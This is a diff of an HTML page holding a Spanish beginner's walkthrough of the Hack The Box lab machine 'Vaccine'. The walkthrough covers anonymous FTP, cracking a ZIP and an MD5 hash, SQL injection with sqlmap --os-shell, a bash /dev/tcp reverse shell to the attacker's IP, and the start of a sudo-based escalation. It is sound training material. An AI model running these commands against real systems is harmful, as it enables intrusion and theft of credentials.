@@ -1,252 +1,199 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="referrer" content="strict-origin-when-cross-origin">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="color-scheme" content="dark">
-<meta name="theme-color" content="#0b0a1a">
-<meta name="author" content="Sebastián Latorre Muñoz">
-<title>Vaccine · HTB · Guía para principiantes // iphobiuss</title>
-<meta name="description" content="Writeup y guía para principiantes de la máquina Vaccine (Hack The Box, Starting Point): FTP anónimo, cracking de ZIP con zip2john, hash MD5 en el código, SQL injection con sqlmap, reverse shell, estabilización de TTY y escalada por sudo vi. Por Sebastián Latorre Muñoz (iphobiuss).">
-<link rel="canonical" href="https://iphobiuss.github.io/vaccine.html">
-<meta property="og:title" content="Vaccine · HTB · Guía para principiantes">
-<meta property="og:description" content="Primera máquina de SQL injection: de FTP anónimo a root, con un capítulo entero sobre depurar shells cuando algo falla.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://iphobiuss.github.io/vaccine.html">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' shape-rendering='crispEdges'%3E%3Crect width='24' height='24' fill='%230b0a1a'/%3E%3Cg fill='%2339ff14'%3E%3Crect x='8' y='3' width='8' height='2'/%3E%3Crect x='7' y='5' width='2' height='4'/%3E%3Crect x='15' y='5' width='2' height='4'/%3E%3Crect x='5' y='9' width='14' height='12'/%3E%3C/g%3E%3Cg fill='%230b0a1a'%3E%3Crect x='11' y='12' width='2' height='4'/%3E%3Crect x='10' y='16' width='4' height='2'/%3E%3C/g%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=IBM+Plex+Mono:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/base.css">
-<link rel="stylesheet" href="assets/css/writeup.css">
-<style>
-  :root{--machine:var(--magenta);}
-</style>
-</head>
-<body>
-<a class="skip" href="#contenido">Saltar al contenido</a>
-<div class="crt"></div>
-
-<div class="topbar">
-<nav aria-label="Navegación">
-  <span class="brand"><b>iphobiuss</b>::offsec</span>
-  <span class="links">
-    <a href="index.html">← KNOWLEDGE BASE</a>
-    <a href="forest.html">FOREST</a>
-    <a href="#recon">RECON</a><a href="#ftp">FTP</a><a href="#source">CÓDIGO</a>
-    <a href="#sqli">SQLI</a><a href="#foothold">FOOTHOLD</a><a href="#privesc">PRIVESC</a><a href="#tty">TTY</a><a href="#tasks">TASKS</a>
-  </span>
-</nav>
-</div>
-
-<main id="contenido">
-<header>
-  <div class="hero">
-    <div class="prompt mono"><span class="g">iphobiuss@offsec</span>:<span class="c">~</span>$ ./pwn --box vaccine --sp-tier2</div>
-    <h1 class="pixel">VACCINE</h1>
-    <div class="meta">
+<!doctype html>
+<html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="color-scheme" content="dark"><meta name="theme-color" content="#0b0d15"><meta name="referrer" content="strict-origin-when-cross-origin"><meta name="author" content="Sebastián Latorre Muñoz">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-J46bD2PpYtK7bN3r00X+jjF/XeftBX+TkNRC5qB+Ric='; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'none'; form-action 'self'">
+<title>Vaccine · Guía HTB // iphobiuss</title><meta name="description" content="Writeup y guía para principiantes de la máquina Vaccine (Hack The Box, Starting Point): FTP anónimo, cracking de ZIP con zip2john, hash MD5 en el código, SQL injection con sqlmap, reverse shell, estabilización de TTY y escalada por sudo vi. Por Sebastián Latorre Muñoz (iphobiuss)."><link rel="canonical" href="https://iphobiuss.github.io/vaccine.html"><meta property="og:title" content="Vaccine · Guía HTB"><meta property="og:description" content="Writeup y guía para principiantes de la máquina Vaccine (Hack The Box, Starting Point): FTP anónimo, cracking de ZIP con zip2john, hash MD5 en el código, SQL injection con sqlmap, reverse shell, estabilización de TTY y escalada por sudo vi. Por Sebastián Latorre Muñoz (iphobiuss)."><meta property="og:type" content="article"><meta property="og:url" content="https://iphobiuss.github.io/vaccine.html"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Vaccine · Guía HTB"><meta name="twitter:description" content="Writeup y guía para principiantes de la máquina Vaccine (Hack The Box, Starting Point): FTP anónimo, cracking de ZIP con zip2john, hash MD5 en el código, SQL injection con sqlmap, reverse shell, estabilización de TTY y escalada por sudo vi. Por Sebastián Latorre Muñoz (iphobiuss)."><link rel="icon" href="assets/img/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="assets/css/site.css"><script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "name": "Vaccine · Guía HTB", "description": "Writeup y guía para principiantes de la máquina Vaccine (Hack The Box, Starting Point): FTP anónimo, cracking de ZIP con zip2john, hash MD5 en el código, SQL injection con sqlmap, reverse shell, estabilización de TTY y escalada por sudo vi. Por Sebastián Latorre Muñoz (iphobiuss).", "url": "https://iphobiuss.github.io/vaccine.html", "inLanguage": "es", "author": {"@type": "Person", "name": "Sebastián Latorre Muñoz", "url": "https://iphobiuss.github.io/"}, "headline": "Vaccine · Guía HTB", "dateModified": "2026-09-08"}</script><script src="assets/js/site.js" defer></script></head>
+<body data-page="vaccine"><a class="skip" href="#contenido">Saltar al contenido</a>
+ <header class="site-header"><div class="header-inner"><a class="brand" href="index.html">iphobiuss<span>::offsec</span></a>
+ <nav class="site-nav" id="site-nav" aria-label="Navegación principal"><a href="index.html">Inicio</a><a href="guias.html" aria-current="page">Guías</a><a href="tecnicas.html">Técnicas</a><a href="herramientas.html">Herramientas</a><a href="proyectos.html">Proyectos</a></nav>
+ <div class="header-tools"><a class="icon-button" href="buscar.html" aria-label="Buscar en el sitio">Buscar</a><button type="button" class="icon-button retro-toggle js-only" data-retro-toggle aria-pressed="false" hidden>Efectos retro</button><button type="button" class="icon-button menu-toggle" aria-controls="site-nav" aria-expanded="false" hidden>Menú</button></div></div><div class="reading-progress" aria-hidden="true"></div></header><main class="site-main" id="contenido" tabindex="-1"><div class="page-head"><div class="shell"><p class="eyebrow"><a href="guias.html">Guías</a> / 04 · Linux</p><h1>VACCINE</h1><div class="meta">
       <span class="badge b1">HTB</span>
       <span class="badge b2">LINUX</span>
       <span class="badge b3">VERY EASY</span>
       <span class="badge b4">SQLI</span>
       <span class="badge b5">SUDO</span>
     </div>
-    <p class="pitch">Guía para principiantes de <b>Vaccine</b> (Starting Point, Tier 2), la <b>#4</b> de la serie y la primera de <b>SQL injection</b>. Una cadena larga y muy didáctica: FTP anónimo, cracking de un ZIP, un hash escondido en el código, inyección SQL con sqlmap, y una escalada por <code>sudo</code>. Incluye algo que ninguna otra guía trae: un capítulo entero sobre <b>qué hacer cuando la shell no coopera</b>, porque en esta máquina el verdadero jefe final fue el terminal.</p>
-
-    <div class="chain">
-      <div class="lnk" style="--acc:var(--cyan)"><div class="n">01</div><div class="t"><b>RECON</b><br>FTP anónimo</div></div>
-      <div class="lnk" style="--acc:var(--amber)"><div class="n">02</div><div class="t"><b>CRACK</b><br>zip2john + MD5</div></div>
-      <div class="lnk" style="--acc:var(--magenta)"><div class="n">03</div><div class="t"><b>SQLI</b><br>sqlmap · os-shell</div></div>
-      <div class="lnk" style="--acc:var(--green)"><div class="n">04</div><div class="t"><b>FOOTHOLD</b><br>reverse shell · postgres</div></div>
-      <div class="lnk" style="--acc:var(--violet)"><div class="n">05</div><div class="t"><b>PRIVESC</b><br>sudo vi → root</div></div>
-    </div>
-  </div>
-</header>
-
-<div class="intro">
+    <div class="article-meta"><time datetime="2026-09-08">Edición: 8 sep 2026</time><span>11 min de lectura aprox.</span><span>Starting Point · Tier 2</span></div><p>Guía para principiantes de <b>Vaccine</b> (Starting Point, Tier 2), la <b>#4</b> de la serie y la primera de <b>SQL injection</b>. Una cadena larga y muy didáctica: FTP anónimo, cracking de un ZIP, un hash escondido en el código, inyección SQL con sqlmap, y una escalada por <code>sudo</code>. Incluye algo que ninguna otra guía trae: un capítulo entero sobre <b>qué hacer cuando la shell no coopera</b>, porque en esta máquina el verdadero jefe final fue el terminal.</p></div></div><div class="shell article-layout"><aside class="article-toc"><span class="toc-label">En esta guía</span><nav aria-label="Índice de la guía"><a href="#recon">01 · RECONOCIMIENTO</a><a href="#ftp">02 · FTP ANÓNIMO + CRACKING</a><a href="#source">03 · CÓDIGO FUENTE + MD5</a><a href="#sqli">04 · SQL INJECTION</a><a href="#foothold">05 · FOOTHOLD · SHELL ESTABLE</a><a href="#privesc">06 · ESCALADA · SUDO VI</a><a href="#tty">07 · CUANDO LA SHELL NO COOPERA</a><a href="#tasks">TASKS · GUIDED MODE</a><a href="#takeaways">CONCEPTOS NUEVOS (vs LA SERIE)</a></nav></aside><div class="article-content"><details class="mobile-toc"><summary>En esta guía</summary><nav aria-label="Índice móvil"><a href="#recon">01 · RECONOCIMIENTO</a><a href="#ftp">02 · FTP ANÓNIMO + CRACKING</a><a href="#source">03 · CÓDIGO FUENTE + MD5</a><a href="#sqli">04 · SQL INJECTION</a><a href="#foothold">05 · FOOTHOLD · SHELL ESTABLE</a><a href="#privesc">06 · ESCALADA · SUDO VI</a><a href="#tty">07 · CUANDO LA SHELL NO COOPERA</a><a href="#tasks">TASKS · GUIDED MODE</a><a href="#takeaways">CONCEPTOS NUEVOS (vs LA SERIE)</a></nav></details><div class="notice">
   <b>Ojo con la VPN:</b> Vaccine vive en <b>Starting Point</b>, que tiene su <b>propia VPN</b>, distinta de la de Machines que usan <a href="cap.html">Cap</a>, <a href="knife.html">Knife</a> y <a href="forest.html">Forest</a>. Descarga el <code class="ic">.ovpn</code> de Starting Point, no el de Machines. El resto del flujo de conexión es el de siempre (ver <a href="setup.html">00 · Setup</a>). En esta guía la IP objetivo es <span class="mono">10.129.64.156</span> y la del atacante (tun0) <span class="mono">10.10.14.33</span>; las tuyas serán distintas.
 </div>
 
-<!-- RECON -->
-<section id="recon" style="--acc:var(--cyan)">
+<details class="spoiler"><summary>Resumen del recorrido · contiene spoilers</summary><div class="chain">
+      <div class="lnk"><div class="n">01</div><div class="t"><b>RECON</b><br>FTP anónimo</div></div>
+      <div class="lnk"><div class="n">02</div><div class="t"><b>CRACK</b><br>zip2john + MD5</div></div>
+      <div class="lnk"><div class="n">03</div><div class="t"><b>SQLI</b><br>sqlmap · os-shell</div></div>
+      <div class="lnk"><div class="n">04</div><div class="t"><b>FOOTHOLD</b><br>reverse shell · postgres</div></div>
+      <div class="lnk"><div class="n">05</div><div class="t"><b>PRIVESC</b><br>sudo vi → root</div></div>
+    </div>
+  </details><details class="environment"><summary>Entorno y versiones documentadas</summary><ul><li>Kali Linux y VirtualBox: versiones no especificadas en la guía original.</li></ul><p>Las versiones indicadas provienen del texto original. La fecha de edición identifica la revisión de esta página; no implica que se haya repetido el laboratorio.</p></details><div class="guide-controls js-only" hidden><span>Modo de lectura</span><button class="small-button" type="button" data-guide-mode="full" aria-pressed="true">Guía completa</button><button class="small-button" type="button" data-guide-mode="hints" aria-pressed="false">Solo pistas</button><button class="small-button print-button" type="button" data-print>Imprimir / PDF</button></div><section id="recon">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">01 · RECONOCIMIENTO</h2></div>
     <div class="sec-focus">Tres puertos conocidos, pero uno esconde un regalo.</div>
-    <pre><span class="k">nmap</span> -p- --min-rate 1000 -oA nmap/allports 10.129.64.156</pre>
-    <pre>21/tcp open  ftp
+    <div class="hint"><b>PISTA</b>Identifica los puertos abiertos, sus servicios y versiones. Anota una hipótesis de entrada por cada servicio.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">nmap</span> -p- --min-rate 1000 -oA nmap/allports 10.129.64.156</code></pre>
+    </figure><figure class="code-block" data-code-kind="output"><figcaption><span>Salida de ejemplo</span></figcaption><pre tabindex="0" aria-label="Salida de ejemplo; desplazamiento horizontal disponible"><code>21/tcp open  ftp
 22/tcp open  ssh
-80/tcp open  http</pre>
-    <p class="f">Los mismos tres de Cap. <code class="ic">ttl=63</code> apunta a Linux (pista, no prueba). SSH pide credenciales (cerrado por ahora), HTTP es la web. Pero antes de la web, el puerto <b>21 (FTP)</b> pide un chequeo obligatorio.</p>
+80/tcp open  http</code></pre>
+    </figure><p class="f">Los mismos tres de Cap. <code class="ic">ttl=63</code> apunta a Linux (pista, no prueba). SSH pide credenciales (cerrado por ahora), HTTP es la web. Pero antes de la web, el puerto <b>21 (FTP)</b> pide un chequeo obligatorio.</p>
     <div class="why"><b>REFLEJO: FTP ABIERTO → PROBAR ANÓNIMO</b>Cuando veas el puerto 21, lo primero es comprobar si permite acceso <b>anónimo</b>: entrar con el usuario <code class="ic">anonymous</code> y cualquier contraseña. Es un chequeo de 20 segundos que en muchas máquinas abre la puerta antes de tocar nada más.</div>
-  </div>
+  </details></div>
 </section>
 
-<!-- FTP -->
-<section id="ftp" style="--acc:var(--amber)">
+<section id="ftp">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">02 · FTP ANÓNIMO + CRACKING</h2></div>
     <div class="sec-focus">Un backup protegido se ataca igual que un hash: offline.</div>
 
-    <h3 class="step">Entrar y bajar el backup</h3>
-    <pre><span class="k">ftp</span> 10.129.64.156
+    <div class="hint"><b>PISTA</b>Revisa si puedes acceder sin una cuenta personal y qué archivos de respaldo quedan expuestos.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><h3 class="step">Entrar y bajar el backup</h3>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">ftp</span> 10.129.64.156
 <span class="cmt"># usuario: anonymous · contraseña: (Enter, vacía)</span>
 ftp&gt; ls              <span class="cmt"># -&gt; backup.zip</span>
 ftp&gt; binary          <span class="cmt"># modo binario, para que el zip no se corrompa</span>
 ftp&gt; get backup.zip
-ftp&gt; bye</pre>
-    <p class="f">El <code class="ic">230 Login successful</code> confirma el acceso anónimo. Dentro hay un <b><code class="ic">backup.zip</code></b>. Un "backup" es de lo más goloso: suele guardar código, configuraciones o credenciales.</p>
+ftp&gt; bye</code></pre>
+    </figure><p class="f">El <code class="ic">230 Login successful</code> confirma el acceso anónimo. Dentro hay un <b><code class="ic">backup.zip</code></b>. Un "backup" es de lo más goloso: suele guardar código, configuraciones o credenciales.</p>
 
     <h3 class="step">El ZIP está protegido: crackearlo</h3>
     <p class="f">Al abrirlo pide contraseña. Mismo problema que un hash, misma solución: extraer la parte crackeable y romperla offline con diccionario. La herramienta es <code class="ic">zip2john</code> (de la suite John the Ripper).</p>
-    <pre><span class="k">zip2john</span> backup.zip &gt; zip.hash
-<span class="k">john</span> --wordlist=/usr/share/wordlists/rockyou.txt zip.hash   <span class="cmt"># -&gt; 741852963</span></pre>
-    <div class="why"><b>LA FAMILIA *2john</b>Hay un extractor por tipo de archivo: <code class="ic">zip2john</code>, <code class="ic">ssh2john</code>, <code class="ic">pdf2john</code>, etc. Todos siguen el mismo patrón: convierten un archivo protegido en un hash que john puede atacar.</div>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">zip2john</span> backup.zip &gt; zip.hash
+<span class="k">john</span> --wordlist=/usr/share/wordlists/rockyou.txt zip.hash   <span class="cmt"># -&gt; 741852963</span></code></pre>
+    </figure><div class="why"><b>LA FAMILIA *2john</b>Hay un extractor por tipo de archivo: <code class="ic">zip2john</code>, <code class="ic">ssh2john</code>, <code class="ic">pdf2john</code>, etc. Todos siguen el mismo patrón: convierten un archivo protegido en un hash que john puede atacar.</div>
 
     <h3 class="step">Abrir el ZIP</h3>
-    <pre><span class="k">unzip</span> backup.zip   <span class="cmt"># contraseña: 741852963  ·  contiene index.php y style.css</span></pre>
-  </div>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">unzip</span> backup.zip   <span class="cmt"># contraseña: 741852963  ·  contiene index.php y style.css</span></code></pre>
+  </figure></details></div>
 </section>
 
-<!-- SOURCE -->
-<section id="source" style="--acc:var(--cyan)">
+<section id="source">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">03 · CÓDIGO FUENTE + MD5</h2></div>
     <div class="sec-focus">El código de una web suele guardar sus propias llaves.</div>
 
-    <p class="f">El <code class="ic">backup.zip</code> era una copia del sitio (<code class="ic">index.php</code> = la página de login). Leyendo el código aparece la comprobación del login:</p>
-    <pre><span class="k">cat</span> index.php
+    <div class="hint"><b>PISTA</b>Lee cómo comprueba las credenciales el código. Identifica la representación usada para guardarlas.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><p class="f">El <code class="ic">backup.zip</code> era una copia del sitio (<code class="ic">index.php</code> = la página de login). Leyendo el código aparece la comprobación del login:</p>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">cat</span> index.php
 <span class="cmt"># ...</span>
 if($_POST['username'] === 'admin' &amp;&amp;
-   md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") { ...</pre>
-    <p class="f">Usuario <b><code class="ic">admin</code></b>, y la contraseña guardada como <b>hash MD5</b>. Tercera vez en la máquina que aplicamos el mismo reflejo: hash a la vista, se crackea offline. A john conviene decirle el tipo (<code class="ic">Raw-MD5</code>), porque un MD5 pelado se parece a varios formatos.</p>
-    <pre><span class="k">echo</span> '2cb42f8734ea607eefed3b70af13bbd3' &gt; md5.hash
-<span class="k">john</span> --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt md5.hash   <span class="cmt"># -&gt; qwerty789</span></pre>
-    <p class="f">Credenciales del panel: <b><code class="ic">admin</code> / <code class="ic">qwerty789</code></b>. El código también decía que un login correcto redirige a <code class="ic">dashboard.php</code>: hay un panel detrás.</p>
-  </div>
+   md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") { ...</code></pre>
+    </figure><p class="f">Usuario <b><code class="ic">admin</code></b>, y la contraseña guardada como <b>hash MD5</b>. Tercera vez en la máquina que aplicamos el mismo reflejo: hash a la vista, se crackea offline. A john conviene decirle el tipo (<code class="ic">Raw-MD5</code>), porque un MD5 pelado se parece a varios formatos.</p>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">echo</span> '2cb42f8734ea607eefed3b70af13bbd3' &gt; md5.hash
+<span class="k">john</span> --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt md5.hash   <span class="cmt"># -&gt; qwerty789</span></code></pre>
+    </figure><p class="f">Credenciales del panel: <b><code class="ic">admin</code> / <code class="ic">qwerty789</code></b>. El código también decía que un login correcto redirige a <code class="ic">dashboard.php</code>: hay un panel detrás.</p>
+  </details></div>
 </section>
 
-<!-- SQLI -->
-<section id="sqli" style="--acc:var(--magenta)">
+<section id="sqli">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">04 · SQL INJECTION</h2></div>
     <div class="sec-focus">El plato fuerte de Vaccine, y el vector nuevo de la serie.</div>
 
-    <div class="fcard magenta">
+    <div class="hint"><b>PISTA</b>Comprueba si el valor del parámetro modifica el comportamiento de una consulta. Conserva también la sesión autenticada.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><div class="fcard magenta">
       <h4>▚ ¿Qué es una SQL injection?</h4>
       <p>Cuando escribes en un buscador, la web arma una consulta a su base de datos con tu texto dentro. Si lo mete <b>sin limpiarlo</b>, puedes escribir no solo un valor de búsqueda, sino <b>trozos de la propia consulta SQL</b>, y la base de datos los ejecuta como instrucciones. Le "inyectas" comandos.</p>
     </div>
 
     <h3 class="step">Confirmar a mano (una comilla)</h3>
     <p class="f">Entra al panel (<code class="ic">admin</code> / <code class="ic">qwerty789</code>) y verás el "MegaCorp Car Catalogue" con un buscador. El test más básico de SQLi es meter una <b>comilla simple</b> y ver si la consulta se rompe:</p>
-    <pre>búsqueda:  '
+    <figure class="code-block" data-code-kind="example"><figcaption><span>Ejemplo de la guía</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar ejemplo de la guía">Copiar</button></figcaption><pre tabindex="0" aria-label="Ejemplo de la guía; desplazamiento horizontal disponible"><code>búsqueda:  '
 ERROR: unterminated quoted string at or near "'"
-LINE 1: Select * from cars where name ilike '%'%'</pre>
-    <p class="f">Ese error lo confirma todo: tu texto entra crudo en la consulta (tu comilla cerró la cadena antes de tiempo), y el formato del error delata el motor: <b>PostgreSQL</b>. La búsqueda viaja por GET en <code class="ic">dashboard.php?search=</code>.</p>
+LINE 1: Select * from cars where name ilike '%'%'</code></pre>
+    </figure><p class="f">Ese error lo confirma todo: tu texto entra crudo en la consulta (tu comilla cerró la cadena antes de tiempo), y el formato del error delata el motor: <b>PostgreSQL</b>. La búsqueda viaja por GET en <code class="ic">dashboard.php?search=</code>.</p>
 
     <h3 class="step">Explotar con sqlmap</h3>
     <p class="f">Confirmada la vulnerabilidad a mano, se automatiza con <b>sqlmap</b>. Necesita la URL, el parámetro, y tu <b>cookie de sesión</b> (el panel requiere login; sin la cookie, sqlmap vería el login). La cookie <code class="ic">PHPSESSID</code> se saca de las DevTools del navegador (F12 → Storage → Cookies).</p>
-    <pre><span class="k">sqlmap</span> -u "http://10.129.64.156/dashboard.php?search=Elixir" \
-       --cookie="PHPSESSID=TU_COOKIE" --batch</pre>
-    <p class="f">sqlmap confirma la inyección con varias técnicas (boolean, error, stacked, time-based) y detecta PostgreSQL sobre Ubuntu. Con eso validado, viene la joya.</p>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">sqlmap</span> -u "http://10.129.64.156/dashboard.php?search=Elixir" \
+       --cookie="PHPSESSID=TU_COOKIE" --batch</code></pre>
+    </figure><p class="f">sqlmap confirma la inyección con varias técnicas (boolean, error, stacked, time-based) y detecta PostgreSQL sobre Ubuntu. Con eso validado, viene la joya.</p>
 
     <div class="fcard">
       <h4>▚ De inyección SQL a shell: --os-shell</h4>
       <p>Cuando el motor es PostgreSQL y el usuario de la base de datos es <b>DBA</b> (administrador), sqlmap puede usar la técnica <code class="ic">COPY ... FROM PROGRAM</code> para ejecutar comandos del sistema. La opción que lo activa es <b><code class="ic">--os-shell</code></b>: la inyección deja de darte solo datos y te da una shell en la máquina.</p>
     </div>
-    <pre><span class="k">sqlmap</span> -u "http://10.129.64.156/dashboard.php?search=Elixir" \
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">sqlmap</span> -u "http://10.129.64.156/dashboard.php?search=Elixir" \
        --cookie="PHPSESSID=TU_COOKIE" --batch --os-shell
-<span class="cmt"># current user is DBA -&gt; 1  ·  os-shell&gt; whoami -&gt; postgres</span></pre>
-  </div>
+<span class="cmt"># current user is DBA -&gt; 1  ·  os-shell&gt; whoami -&gt; postgres</span></code></pre>
+  </figure></details></div>
 </section>
 
-<!-- FOOTHOLD -->
-<section id="foothold" style="--acc:var(--green)">
+<section id="foothold">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">05 · FOOTHOLD · SHELL ESTABLE</h2></div>
     <div class="sec-focus">La os-shell es incómoda: el primer objetivo es una shell de verdad.</div>
 
-    <h3 class="step">Reverse shell desde la os-shell</h3>
+    <div class="hint"><b>PISTA</b>Valida las credenciales conseguidas en un servicio de acceso remoto disponible.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><h3 class="step">Reverse shell desde la os-shell</h3>
     <p class="f">La <code class="ic">os-shell&gt;</code> funciona pero es lenta y no interactiva. Se usa solo para dar el salto a una shell propia, con la reverse shell de siempre (netcat a la escucha, la víctima llama de vuelta a tu IP y puerto).</p>
-    <pre><span class="cmt"># en Kali:</span>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="cmt"># en Kali:</span>
 <span class="k">nc</span> -lvnp 4444
 <span class="cmt"># en la os-shell&gt; :</span>
-bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.33/4444 0&gt;&amp;1'</pre>
-    <p class="f">Cae la conexión como <code class="ic">postgres@vaccine</code>. Foothold conseguido vía la SQLi.</p>
+bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.33/4444 0&gt;&amp;1'</code></pre>
+    </figure><p class="f">Cae la conexión como <code class="ic">postgres@vaccine</code>. Foothold conseguido vía la SQLi.</p>
 
     <h3 class="step">Buscar la user flag y las credenciales</h3>
     <p class="f">postgres es un usuario de servicio; su flag está en su home. Y el código del dashboard, que se conecta a la base de datos, guarda la contraseña en claro:</p>
-    <pre><span class="k">cat</span> /var/lib/postgresql/user.txt   <span class="cmt"># user flag</span>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">cat</span> /var/lib/postgresql/user.txt   <span class="cmt"># user flag</span>
 <span class="k">cat</span> /var/www/html/dashboard.php
-<span class="cmt"># pg_connect("host=localhost ... user=postgres password=P@s5w0rd!")</span></pre>
-    <div class="why"><b>ESA CONTRASEÑA ES LA DE postgres</b>El <code class="ic">P@s5w0rd!</code> del dashboard no es solo de la base de datos: es la contraseña de la <b>cuenta del sistema</b> postgres (lo confirma que <code class="ic">sudo</code> la acepta más adelante). Reutilización de credenciales, el reflejo de Cap.</div>
-  </div>
+<span class="cmt"># pg_connect("host=localhost ... user=postgres password=P@s5w0rd!")</span></code></pre>
+    </figure><div class="why"><b>ESA CONTRASEÑA ES LA DE postgres</b>El <code class="ic">P@s5w0rd!</code> del dashboard no es solo de la base de datos: es la contraseña de la <b>cuenta del sistema</b> postgres (lo confirma que <code class="ic">sudo</code> la acepta más adelante). Reutilización de credenciales, el reflejo de Cap.</div>
+  </details></div>
 </section>
 
-<!-- PRIVESC -->
-<section id="privesc" style="--acc:var(--violet)">
+<section id="privesc">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">06 · ESCALADA · SUDO VI</h2></div>
     <div class="sec-focus">Un editor con sudo es una shell de root disfrazada.</div>
 
-    <h3 class="step">La vía limpia: SSH como postgres</h3>
+    <div class="hint"><b>PISTA</b>Compara los permisos habituales del sistema con los que tiene esta cuenta. Investiga los binarios que destacan.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><h3 class="step">La vía limpia: SSH como postgres</h3>
     <p class="f">Como <code class="ic">P@s5w0rd!</code> es la contraseña de la cuenta postgres, en vez de pelear con la reverse shell conviene entrar por <b>SSH</b>, que da una terminal de verdad desde el principio (clave para el paso siguiente):</p>
-    <pre><span class="k">ssh</span> postgres@10.129.64.156   <span class="cmt"># contraseña: P@s5w0rd!</span></pre>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">ssh</span> postgres@10.129.64.156   <span class="cmt"># contraseña: P@s5w0rd!</span></code></pre>
 
-    <h3 class="step">Ver qué permite sudo</h3>
-    <pre><span class="k">sudo</span> -l
-<span class="cmt"># (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</span></pre>
-    <div class="fcard">
+    </figure><h3 class="step">Ver qué permite sudo</h3>
